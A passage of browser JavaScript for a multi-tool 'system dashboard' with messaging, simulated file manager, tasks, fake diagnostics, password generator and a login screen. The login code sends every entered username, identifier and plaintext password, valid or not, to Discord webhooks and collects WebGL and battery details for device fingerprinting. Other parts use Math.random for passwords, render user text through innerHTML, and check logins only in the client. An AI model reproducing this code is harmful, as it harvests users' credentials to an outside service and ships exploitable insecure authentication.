            todayButton.style.boxShadow = `0 0 0 0 rgba(${hexToRgb(settings.primaryColor || '#ff914d')}, 0.4)`;
            todayButton.style.setProperty('--dark-primary-accent-rgb', hexToRgb(settings.primaryColor || '#ff914d')); // Update RGB custom prop for pulse animation
        }

        // Apply to canvas stroke style for active drawing - NEW
        const canvas = document.getElementById('notesCanvas');
        if (canvas) {
          const ctx = canvas.getContext('2d');
          ctx.strokeStyle = settings.primaryColor || '#ff914d';
        }

      },
      // Helper to convert hex to RGB for dynamic shadows - NEW
      hexToRgb: function(hex) {
          let r = 0, g = 0, b = 0;
          // 3 digits
          if (hex.length == 4) {
              r = parseInt(hex[1] + hex[1], 16);
              g = parseInt(hex[2] + hex[2], 16);
              b = parseInt(hex[3] + hex[3], 16);
          }
          // 6 digits
          else if (hex.length == 7) {
              r = parseInt(hex.substring(1, 3), 16);
              g = parseInt(hex.substring(3, 5), 16);
              b = parseInt(hex.substring(5, 7), 16);
          }
          return `${r}, ${g}, ${b}`;
      },


      // NEW: Internal Messaging Module
      initMessaging: function() {
          const chatWindow = document.getElementById('chatWindow');
          const messageInput = document.getElementById('messageInput');
          const sendMessageBtn = document.getElementById('sendMessageBtn');
          const MESSAGING_STORAGE_KEY = 'systemMessages';
          let messages = JSON.parse(localStorage.getItem(MESSAGING_STORAGE_KEY)) || [];

          const predefinedRecipients = [
              { id: 'system', name: 'System Alerts' },
              { id: 'self', name: 'My Notes' }, // User can "message themselves"
              { id: 'ai-assistant', name: 'AI Assistant' } // Future AI
          ];
          const currentRecipient = predefinedRecipients[1]; // Default to My Notes

          const renderMessages = () => {
              chatWindow.innerHTML = '';
              messages.forEach(msg => {
                  const msgDiv = document.createElement('div');
                  msgDiv.classList.add('message');
                  if (msg.senderId === currentRecipient.id) {
                      msgDiv.classList.add('self');
                  }
                  msgDiv.innerHTML = `
                      <div class="message-author">${msg.senderName}</div>
                      <div class="message-content">${msg.content}</div>
                      <div class="message-time">${new Date(msg.timestamp).toLocaleString()}</div>
                  `;
                  chatWindow.appendChild(msgDiv);
              });
              chatWindow.scrollTop = chatWindow.scrollHeight; // Auto-scroll to bottom
          };

          sendMessageBtn.addEventListener('click', () => {
              if (messageInput.value.trim()) {
                  const newMessage = {
                      senderId: currentRecipient.id,
                      senderName: currentRecipient.name,
                      content: messageInput.value.trim(),
                      timestamp: Date.now()
                  };
                  messages.push(newMessage);
                  localStorage.setItem(MESSAGING_STORAGE_KEY, JSON.stringify(messages));
                  messageInput.value = '';
                  renderMessages();
                  notify(`Message sent to "${currentRecipient.name}".`, 'success');
              } else {
                  notify("Cannot send empty message.", 'warning');
              }
          });

          // Allow Enter key to send message - NEW
          messageInput.addEventListener('keydown', (e) => {
              if (e.key === 'Enter') {
                  e.preventDefault();
                  sendMessageBtn.click();
              }
          });

          renderMessages();
      },

      // NEW: File Manager Simulator
      initFileManager: function() {
          const fileStructureDiv = document.getElementById('fileStructure');
          const newFileNameInput = document.getElementById('newFileName');
          const createFolderBtn = document.getElementById('createFolderBtn');
          const createFileBtn = document.getElementById('createFileBtn');
          const deleteSelectedBtn = document.getElementById('deleteSelectedBtn');
          const fileContentDisplay = document.getElementById('fileContentDisplay');
          const currentOpenedFileSpan = document.getElementById('currentOpenedFile');
          const fileTextContent = document.getElementById('fileTextContent');
          const saveFileContentBtn = document.getElementById('saveFileContentBtn');

          const FILE_SYSTEM_STORAGE_KEY = 'simulatedFileSystem';
          let fileSystem = JSON.parse(localStorage.getItem(FILE_SYSTEM_STORAGE_KEY)) || {
              name: 'Root',
              type: 'folder',
              path: '/',
              children: [
                  { name: 'Documents', type: 'folder', path: '/Documents', children: [
                      { name: 'Report.txt', type: 'file', path: '/Documents/Report.txt', content: 'Important project report.' }
                  ]},
                  { name: 'Projects', type: 'folder', path: '/Projects', children: [] },
                  { name: 'README.md', type: 'file', path: '/README.md', content: 'Welcome to your simulated file system!' }
              ]
          };
          let currentPath = '/';
          let selectedElement = null;
          let currentFileContentItem = null; // Store reference to the file object being edited

          const saveFileSystem = () => {
              localStorage.setItem(FILE_SYSTEM_STORAGE_KEY, JSON.stringify(fileSystem));
          };

          const getFolderByPath = (path, fs = fileSystem) => {
              if (path === '/') return fs;
              const parts = path.split('/').filter(p => p !== '');
              let current = fs;
              for (const part of parts) {
                  current = current.children.find(child => child.name === part && child.type === 'folder');
                  if (!current) return null;
              }
              return current;
          };

          const renderFileSystem = (path = currentPath) => {
              fileStructureDiv.innerHTML = '';
              const currentFolder = getFolderByPath(path);
              if (!currentFolder) {
                  currentPath = '/';
                  return renderFileSystem();
              }

              const ul = document.createElement('ul');
              
              if (path !== '/') {
                  const backLi = document.createElement('li');
                  backLi.innerHTML = `<span class="icon folder-icon"></span>... (Go Back)`;
                  backLi.style.fontWeight = 'bold';
                  backLi.addEventListener('click', () => {
                      currentPath = path.substring(0, path.lastIndexOf('/')) || '/';
                      renderFileSystem(currentPath);
                  });
                  ul.appendChild(backLi);
              }

              currentFolder.children.forEach(item => {
                  const li = document.createElement('li');
                  li.innerHTML = `<span class="icon ${item.type}-icon"></span>${item.name}`;
                  li.dataset.path = item.path;
                  li.dataset.type = item.type;
                  if (selectedElement && selectedElement.dataset.path === item.path) {
                      li.style.backgroundColor = 'rgba(255, 145, 77, 0.2)'; // Highlight selected
                  }
                  li.addEventListener('click', (e) => {
                      e.stopPropagation(); // Prevent parent's click if any
                      if (selectedElement) {
                          selectedElement.style.backgroundColor = ''; // Remove previous highlight
                      }
                      selectedElement = li;
                      li.style.backgroundColor = 'rgba(255, 145, 77, 0.2)'; // Highlight current
                      if (item.type === 'folder') {
                          // Allow double click to open folders - NEW
                          if(e.detail === 2) {
                              currentPath = item.path;
                              renderFileSystem(currentPath);
                          }
                      } else if (item.type === 'file') {
                          dashboard.openFileForEdit(item);
                          notify(`Selected file: ${item.name}`, 'info');
                      }
                  });
                  ul.appendChild(li);
              });
              fileStructureDiv.appendChild(ul);
              currentFileContentItem = null;
              fileContentDisplay.style.display = 'none';
          };

          dashboard.openFileForEdit = (file) => {
            currentOpenedFileSpan.textContent = file.name;
            fileTextContent.value = file.content;
            fileContentDisplay.style.display = 'block';
            currentFileContentItem = file; // Set current file
          };

          saveFileContentBtn.addEventListener('click', () => {
            if (currentFileContentItem) {
                currentFileContentItem.content = fileTextContent.value;
                saveFileSystem();
                notify(`Content saved for ${currentFileContentItem.name}.`, 'success');
            }
          });


          createFolderBtn.addEventListener('click', () => {
              const name = newFileNameInput.value.trim();
              if (name) {
                  const parent = getFolderByPath(currentPath);
                  if (parent && !parent.children.some(c => c.name === name && c.type === 'folder')) {
                      parent.children.push({ name, type: 'folder', path: `${currentPath}/${name}`, children: [] });
                      saveFileSystem();
                      renderFileSystem();
                      newFileNameInput.value = '';
                      notify(`Folder "${name}" created.`, 'success');
                  } else {
                    notify('A folder with that name already exists.', 'warning');
                  }
              } else {
                  notify('Please enter a folder name.', 'warning');
              }
          });

          createFileBtn.addEventListener('click', () => {
              const name = newFileNameInput.value.trim();
              if (name) {
                  const parent = getFolderByPath(currentPath);
                  if (parent && !parent.children.some(c => c.name === name && c.type === 'file')) {
                      parent.children.push({ name, type: 'file', path: `${currentPath}/${name}`, content: '' });
                      saveFileSystem();
                      renderFileSystem();
                      newFileNameInput.value = '';
                      notify(`File "${name}" created.`, 'success');
                  } else {
                    notify('A file with that name already exists.', 'warning');
                  }
              } else {
                  notify('Please enter a file name.', 'warning');
              }
          });

          deleteSelectedBtn.addEventListener('click', () => {
              if (selectedElement) {
                  const pathToDelete = selectedElement.dataset.path;
                  if (pathToDelete === '/') {
                    notify("Cannot delete Root directory!", 'error');
                    return;
                  }

                  if (confirm(`Are you sure you want to delete "${selectedElement.textContent.trim()}"?`)) {
                      const parentPath = pathToDelete.substring(0, pathToDelete.lastIndexOf('/')) || '/';
                      const parent = getFolderByPath(parentPath);
                      if (parent) {
                          parent.children = parent.children.filter(child => child.path !== pathToDelete);
                          saveFileSystem();
                          renderFileSystem();
                          selectedElement = null; // Clear selection
                          if (currentFileContentItem && currentFileContentItem.path === pathToDelete) {
                            fileContentDisplay.style.display = 'none'; // Hide content if deleted
                            currentFileContentItem = null;
                          }
                          notify(`Deleted "${pathToDelete.split('/').pop()}".`, 'info');
                      }
                  }
              } else {
                  notify('No file or folder selected for deletion.', 'warning');
              }
          });

          renderFileSystem(); // Initial render
      },

      // NEW: Daily Tasks & Goals Module
      initTasks: function() {
          const newTaskInput = document.getElementById('newTaskInput');
          const addTaskBtn = document.getElementById('addTaskBtn');
          const tasksList = document.getElementById('tasksList');
          const taskFilterButtons = document.querySelectorAll('#tasksPanel .task-filter button');

          const TASKS_STORAGE_KEY = 'systemTasks';
          let tasks = JSON.parse(localStorage.getItem(TASKS_STORAGE_KEY)) || [];
          let currentFilter = 'all';

          const saveTasks = () => {
              localStorage.setItem(TASKS_STORAGE_KEY, JSON.stringify(tasks));
          };

          const renderTasks = () => {
              tasksList.innerHTML = '';
              const filteredTasks = tasks.filter(task => {
                  if (currentFilter === 'all') return true;
                  if (currentFilter === 'active') return !task.completed;
                  if (currentFilter === 'completed') return task.completed;
                  return true;
              });

              if (filteredTasks.length === 0 && tasks.length > 0) {
                  tasksList.innerHTML = `<li style="text-align: center; color: var(--dark-h2-color); margin-top: 20px;">No ${currentFilter} tasks.</li>`;
                  return;
              } else if (tasks.length === 0) {
                   tasksList.innerHTML = `<li style="text-align: center; color: var(--dark-h2-color); margin-top: 20px;">No tasks yet. Add one!</li>`;
                   return;
              }

              filteredTasks.forEach( (task, index) => {
                  const li = document.createElement('li');
                  li.classList.add('task-item');
                  if (task.completed) {
                      li.classList.add('completed');
                  }
                  // Find original index to delete/modify
                  const originalIndex = tasks.findIndex(t => t.id === task.id);
                  li.innerHTML = `
                      <input type="checkbox" ${task.completed ? 'checked' : ''} data-index="${originalIndex}" data-action="Toggle Task Completion">
                      <span class="task-text">${task.text}</span>
                      <button data-index="${originalIndex}" class="delete-task" data-action="Delete Task">&times;</button>
                  `;
                  tasksList.appendChild(li);
              });
          };

          addTaskBtn.addEventListener('click', () => {
              if (newTaskInput.value.trim()) {
                  const newtask = {
                      id: Date.now(),
                      text: newTaskInput.value.trim(),
                      completed: false
                  };
                  tasks.push(newtask);
                  saveTasks();
                  renderTasks();
                  newTaskInput.value = '';
                  notify('Task added successfully!', 'success');
              } else {
                  notify('Task description cannot be empty.', 'warning');
              }
          });
          // Allow Enter key for adding tasks - NEW
          newTaskInput.addEventListener('keydown', (e) => {
              if (e.key === 'Enter') {
                  e.preventDefault();
                  addTaskBtn.click();
              }
          });


          tasksList.addEventListener('click', (e) => {
              const index = e.target.dataset.index;
              if (e.target.classList.contains('delete-task')) {
                  tasks.splice(index, 1);
                  saveTasks();
                  renderTasks();
                  notify('Task deleted.', 'info');
              } else if (e.target.type === 'checkbox') {
                  tasks[index].completed = e.target.checked;
                  saveTasks();
                  renderTasks();
                  notify(`Task "${tasks[index].text}" marked as ${e.target.checked ? 'completed' : 'active'}.`, 'info');
              }
          });

          taskFilterButtons.forEach(button => {
              button.addEventListener('click', () => {
                  taskFilterButtons.forEach(btn => btn.classList.remove('active'));
                  button.classList.add('active');
                  currentFilter = button.dataset.filter;
                  renderTasks();
                  notify(`Filtering tasks: ${currentFilter}.`, 'info');
              });
          });

          renderTasks(); // Initial render
      },

      // NEW: System Diagnostics Module
      initDiagnostics: function() {
          const runDiagnosticsBtn = document.getElementById('runDiagnosticsBtn');
          const diagnosticOutput = document.getElementById('diagnosticOutput');
          const diagProgressBar = document.getElementById('diagProgressBar');
          const progressBarContainer = document.querySelector('#diagnosticsPanel .progress-bar-container');

          const diagnosticSteps = [
              { name: "System Startup Check", time: 800, result: "🟢 [OK] Core systems are responsive." },
              { name: "CPU Load Assessment", time: 1200, result: "🔵 [INFO] CPU activity normal. Load: 15%." },
              { name: "Memory Integrity Scan", time: 1500, result: "🟢 [OK] RAM verification complete. No errors found." },
              { name: "Network Latency Test", time: 1000, result: "🔵 [INFO] Network latency within acceptable parameters (20ms)." },
              { name: "Storage Sector Check", time: 2000, result: "🟢 [OK] Data integrity verified. Storage healthy." },
              { name: "Security Protocol Scan", time: 1800, result: "🟠 [WARNING] Firewall rules partially outdated. Recommendation: Update." },
              { name: "Application Status Audit", time: 1000, result: "🟢 [OK] Essential applications operational." }
          ];

          runDiagnosticsBtn.addEventListener('click', () => {
              diagnosticOutput.innerHTML = '<p>Initiating System Diagnostics...</p>';
              runDiagnosticsBtn.disabled = true;
              progressBarContainer.style.display = 'block';
              diagProgressBar.style.width = '0%';
              diagProgressBar.textContent = '0%';
              let currentProgress = 0;
              let stepDurationTotal = diagnosticSteps.reduce((acc, step) => acc + step.time, 0);
              let elapsedTime = 0;

              const animateProgressBar = setInterval(() => {
                  elapsedTime += 100;
                  currentProgress = Math.min(100, (elapsedTime / stepDurationTotal) * 100);
                  diagProgressBar.style.width = `${currentProgress}%`;
                  diagProgressBar.textContent = `${Math.round(currentProgress)}%`;
                  if (currentProgress >= 100) {
                      clearInterval(animateProgressBar);
                  }
              }, 100);

              let currentStep = 0;
              const runStep = () => {
                  if (currentStep < diagnosticSteps.length) {
                      const step = diagnosticSteps[currentStep];
                      diagnosticOutput.innerHTML += `<p>> Running: ${step.name}...</p>`;
                      diagnosticOutput.scrollTop = diagnosticOutput.scrollHeight; // Auto-scroll
                      setTimeout(() => {
                          diagnosticOutput.innerHTML += `<p>${step.result}</p>`;
                          diagnosticOutput.scrollTop = diagnosticOutput.scrollHeight;
                          currentStep++;
                          runStep();
                      }, step.time);
                  } else {
                      diagnosticOutput.innerHTML += `<p>=== Diagnostics Complete ===</p><p>Summary: All major systems checked. See warnings above for recommendations.</p>`;
                      diagnosticOutput.scrollTop = diagnosticOutput.scrollHeight;
                      runDiagnosticsBtn.disabled = false;
                      progressBarContainer.style.display = 'none'; // Hide progress bar after completion
                      notify("System diagnostics completed.", 'success');
                  }
              };
              runStep();
          });
      },

      // NEW: Password Generator Module
      initPasswordGenerator: function() {
          const generatedPasswordSpan = document.getElementById('generatedPassword');
          const passwordLengthInput = document.getElementById('passwordLength');
          const passLengthValueSpan = document.getElementById('passLengthValue');
          const includeUppercaseCheckbox = document.getElementById('includeUppercase');
          const includeLowercaseCheckbox = document.getElementById('includeLowercase');
          const includeNumbersCheckbox = document.getElementById('includeNumbers');
          const includeSymbolsCheckbox = document.getElementById('includeSymbols');
          const generatePassBtn = document.getElementById('generatePassBtn');

          const generatePassword = () => {
              const length = parseInt(passwordLengthInput.value, 10);
              const includeUppercase = includeUppercaseCheckbox.checked;
              const includeLowercase = includeLowercaseCheckbox.checked;
              const includeNumbers = includeNumbersCheckbox.checked;
              const includeSymbols = includeSymbolsCheckbox.checked;

              let chars = '';
              if (includeUppercase) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
              if (includeLowercase) chars += 'abcdefghijklmnopqrstuvwxyz';
              if (includeNumbers) chars += '0123456789';
              if (includeSymbols) chars += '!@#$%^&*()_+~`|}{[]:;?><,./-=';

              if (chars === '') {
                  generatedPasswordSpan.textContent = 'Select at least one character type.';
                  return;
              }

              let password = '';
              for (let i = 0; i < length; i++) {
                  password += chars.charAt(Math.floor(Math.random() * chars.length));
              }
              generatedPasswordSpan.textContent = password;
              notify('Password generated.', 'info');
          };

          passwordLengthInput.addEventListener('input', () => {
              passLengthValueSpan.textContent = passwordLengthInput.value;
          });

          generatePassBtn.addEventListener('click', generatePassword);

          // Initial generation
          generatePassword();
      },

      // NEW: Network Scanner (Simulated) Module
      initNetworkScanner: function() {
          const startScanBtn = document.getElementById('startScanBtn');
          const networkScanOutput = document.getElementById('networkScanOutput');

          const generateRandomIP = () => {
              return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
          };

          const simulateScan = () => {
              networkScanOutput.innerHTML = ''; // Clear previous output
              networkScanOutput.classList.add('scanning'); // Add scanning animation
              startScanBtn.disabled = true;

              const scanDelay = 500;
              const numDevices = Math.floor(Math.random() * 5) + 3; // 3 to 7 devices

              let devices = [];
              for (let i = 0; i < numDevices; i++) {
                  devices.push({
                      ip: generateRandomIP(),
                      hostname: `DEVICE-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
                      status: 'Active',
                      mac: 'XX:XX:XX:XX:XX:XX'.replace(/X/g, () => (Math.random() * 16 | 0).toString(16).toUpperCase()),
                      os: Math.random() < 0.5 ? 'Windows' : (Math.random() < 0.5 ? 'Linux' : 'macOS'),
                      ports: `${Math.floor(Math.random() * 5) + 1} open`
                  });
              }

              let deviceIndex = 0;
              const scanInterval = setInterval(() => {
                  if (deviceIndex < devices.length) {
                      networkScanOutput.innerHTML += `<p>[+] Found Device: ${devices[deviceIndex].ip} - ${devices[deviceIndex].hostname}</p>`;
                      networkScanOutput.scrollTop = networkScanOutput.scrollHeight;
                      deviceIndex++;
                  } else {
                      clearInterval(scanInterval);
                      networkScanOutput.classList.remove('scanning');
                      networkScanOutput.innerHTML += `<h3>Scan Complete. Found ${devices.length} Devices.</h3>`;
                      const table = document.createElement('table');
                      table.innerHTML = `
                          <thead>
                              <tr>
                                  <th>IP Address</th>
                                  <th>Hostname</th>
                                  <th>Status</th>
                                  <th>MAC Address</th>
                                  <th>OS</th>
                                  <th>Open Ports</th>
                              </tr>
                          </thead>
                          <tbody id="scanResultsTableBody"></tbody>
                      `;
                      networkScanOutput.appendChild(table);
                      const tbody = document.getElementById('scanResultsTableBody');
                      devices.forEach(device => {
                          const row = tbody.insertRow();
                          row.innerHTML = `
                              <td>${device.ip}</td>
                              <td>${device.hostname}</td>
                              <td>${device.status}</td>
                              <td>${device.mac}</td>
                              <td>${device.os}</td>
                              <td>${device.ports}</td>
                          `;
                      });
                      startScanBtn.disabled = false;
                      notify('Network scan simulation finished.', 'success');
                  }
              }, scanDelay);
          };

          startScanBtn.addEventListener('click', simulateScan);
      },

      // NEW: Encrypt/Decrypt Text Tool Module
      initEncryptDecrypt: function() {
          const encryptInput = document.getElementById('encryptInput');
          const cipherKeyInput = document.getElementById('cipherKey');
          const encryptTextBtn = document.getElementById('encryptTextBtn');
          const decryptTextBtn = document.getElementById('decryptTextBtn');
          const encryptOutput = document.getElementById('encryptOutput');

          const caesarShift = (text, key, encode = true) => {
              if (!key) return text; // No key, no encryption
              const shift = (typeof key === 'string' ? key.length : key) % 26; // Use key length for shift for simplicity
              let result = '';
              for (let i = 0; i < text.length; i++) {
                  let charCode = text.charCodeAt(i);
                  // Uppercase letters
                  if (charCode >= 65 && charCode <= 90) {
                      charCode = ((charCode - 65 + (encode ? shift : -shift) + 26) % 26) + 65;
                  }
                  // Lowercase letters
                  else if (charCode >= 97 && charCode <= 122) {
                      charCode = ((charCode - 97 + (encode ? shift : -shift) + 26) % 26) + 97;
                  }
                  result += String.fromCharCode(charCode);
              }
              return result;
          };

          encryptTextBtn.addEventListener('click', () => {
              const text = encryptInput.value;
              const key = cipherKeyInput.value;
              if (text && key) {
                  encryptOutput.value = caesarShift(text, key, true);
                  notify('Text encrypted.', 'success');
              } else {
                  notify('Enter text and a cipher key to encrypt.', 'warning');
              }
          });

          decryptTextBtn.addEventListener('click', () => {
              const text = encryptInput.value;
              const key = cipherKeyInput.value;
              if (text && key) {
                  encryptOutput.value = caesarShift(text, key, false);
                  notify('Text decrypted.', 'success');
              } else {
                  notify('Enter text and a cipher key to decrypt.', 'warning');
              }
          });
      },

      // NEW: Code Editor (Sandbox) Module
      initCodeEditor: function() {
          const codeSnippetNameInput = document.getElementById('codeSnippetName');
          const newSnippetBtn = document.getElementById('newSnippetBtn');
          const saveSnippetBtn = document.getElementById('saveSnippetBtn');
          const deleteSnippetBtn = document.getElementById('deleteSnippetBtn');
          const codeEditorInput = document.getElementById('codeEditorInput');
          const codeSnippetList = document.getElementById('codeSnippetList');

          const CODE_STORAGE_KEY = 'codeSnippets';
          let codeSnippets = JSON.parse(localStorage.getItem(CODE_STORAGE_KEY)) || [];
          let activeSnippetId = null;

          const saveSnippets = () => {
              localStorage.setItem(CODE_STORAGE_KEY, JSON.stringify(codeSnippets));
          };

          const renderSnippetList = () => {
              codeSnippetList.innerHTML = '';
              if (codeSnippets.length === 0) {
                  codeSnippetList.innerHTML = '<span style="color: var(--dark-h2-color);">No snippets saved.</span>';
                  return;
              }
              codeSnippets.forEach(snippet => {
                  const snippetSpan = document.createElement('span');
                  snippetSpan.textContent = snippet.name;
                  snippetSpan.dataset.id = snippet.id;
                  if (activeSnippetId === snippet.id) {
                      snippetSpan.classList.add('active-file');
                  }
                  snippetSpan.addEventListener('click', () => {
                      dashboard.loadSnippet(snippet.id);
                      notify(`Loaded snippet: ${snippet.name}.`, 'info');
                  });
                  codeSnippetList.appendChild(snippetSpan);
              });
          };

          dashboard.loadSnippet = (id) => {
              const snippet = codeSnippets.find(s => s.id === id);
              if (snippet) {
                  activeSnippetId = id;
                  codeSnippetNameInput.value = snippet.name;
                  codeEditorInput.value = snippet.content;
                  renderSnippetList(); // Update active state visually
                  notify(`Snippet "${snippet.name}" loaded.`, 'info');
              }
          };

          newSnippetBtn.addEventListener('click', () => {
              const name = codeSnippetNameInput.value.trim();
              if (name) {
                  activeSnippetId = Date.now();
                  codeSnippets.push({ id: activeSnippetId, name: name, content: '' });
                  codeSnippetNameInput.value = name;
                  codeEditorInput.value = '';
                  saveSnippets();
                  renderSnippetList();
                  notify(`New snippet "${name}" created.`, 'success');
              } else {
                  notify('Please enter a name for the new snippet.', 'warning');
              }
          });

          saveSnippetBtn.addEventListener('click', () => {
              if (activeSnippetId) {
                  const snippetIndex = codeSnippets.findIndex(s => s.id === activeSnippetId);
                  if (snippetIndex !== -1) {
                      const name = codeSnippetNameInput.value.trim();
                      if(name) {
                        codeSnippets[snippetIndex].name = name; // Update name too
                        codeSnippets[snippetIndex].content = codeEditorInput.value;
                        saveSnippets();
                        renderSnippetList();
                        notify(`Snippet "${name}" saved.`, 'success');
                      } else {
                        notify('Snippet name cannot be empty.', 'warning');
                      }
                  } else {
                      notify('Error: Active snippet not found.', 'error');
                  }
              } else {
                  notify('No snippet selected or active to save. Create a new one.', 'warning');
              }
          });

          deleteSnippetBtn.addEventListener('click', () => {
              if (activeSnippetId && confirm('Are you sure you want to delete this snippet?')) {
                  codeSnippets = codeSnippets.filter(s => s.id !== activeSnippetId);
                  saveSnippets();
                  activeSnippetId = null;
                  codeSnippetNameInput.value = '';
                  codeEditorInput.value = '';
                  renderSnippetList();
                  notify('Snippet deleted.', 'info');
              } else if (!activeSnippetId) {
                  notify('No snippet selected to delete.', 'warning');
              }
          });

          renderSnippetList(); // Initial render
          if (codeSnippets.length > 0) {
              dashboard.loadSnippet(codeSnippets[0].id); // Load first snippet on init
          } else {
            codeEditorInput.value = "// Start your code snippet here...\n";
          }
      },
    };

    // Login System JavaScript
    (() => {
      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
        notify(`Password visibility ${showPasswordCheckbox.checked ? 'enabled' : 'disabled'}.`, 'info');
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
            return res.json();
        })
        .then(data => {
          users = data;
          console.log('User whitelist loaded successfully.'); // Detailed log
        })
        .catch(error => {
          users = [];
          console.error('Failed to load user JSON data:', error);
          errorMsg.textContent = 'System Error: Could not load user data. Try again later.';
          notify('System Error: User data failed to load. Please contact support.', 'error');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch (e) {
            console.warn("Battery status API not accessible:", e); // Specific warning
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e); // Logging webhook failures
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          description: "Username provided during login attempt.",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: `\`${username}\``, inline: true }, // Format username with backticks
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false } // Use ISO format for consistency
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          description: "Password provided during login attempt (plain text for logging).",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: `\`${password}\``, inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          description: "User Identifier provided during login attempt.",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: `\`${identifier}\``, inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          description: "An incorrect username was entered during a login attempt.",
          color: 0xf39c12,
          fields: [
            { name: "Name (Known)", value: name || "N/A", inline: true },
            { name: "Invalid Username Attempt", value: `\`${username}\``, inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          description: "An incorrect password was entered during a login attempt.",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password Attempt", value: `\`${password}\``, inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          description: "An incorrect user identifier was entered during a login attempt.",
          color: 0xd35400,
          fields: [
            { name: "Name (Known)", value: name || "N/A", inline: true },
            { name: "Invalid Identifier Attempt", value: `\`${identifier}\``, inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          description: "A login attempt was made, decrementing the counter.",
          color: 0x9b59b6,
          fields: [
            { name: "Name (Known)", value: name || "N/A", inline: true },
            { name: "Username Used", value: `\`${username}\``, inline: true },
            { name: "Password Used", value: `\`${password}\``, inline: true },
            { name: "Identifier Used", value: `\`${identifier}\``, inline: true },
            { name: "Attempts Left", value: `\`${attemptsLeft}\``, inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          description: "Maximum failed login attempts reached.",
          color: 0xc0392b,
          fields: [
            { name: "Name (Known)", value: name || "N/A", inline: true },
            { name: "Last Username", value: `\`${username}\``, inline: true },
            { name: "Last Password", value: `\`${password}\``, inline: true },
            { name: "Last Identifier", value: `\`${identifier}\``, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED - LOGIN BLOCKED", inline: true },
            { name: "Date/Time (UTC)", value: `\`${new Date().toISOString()}\``, inline: false }
          ],
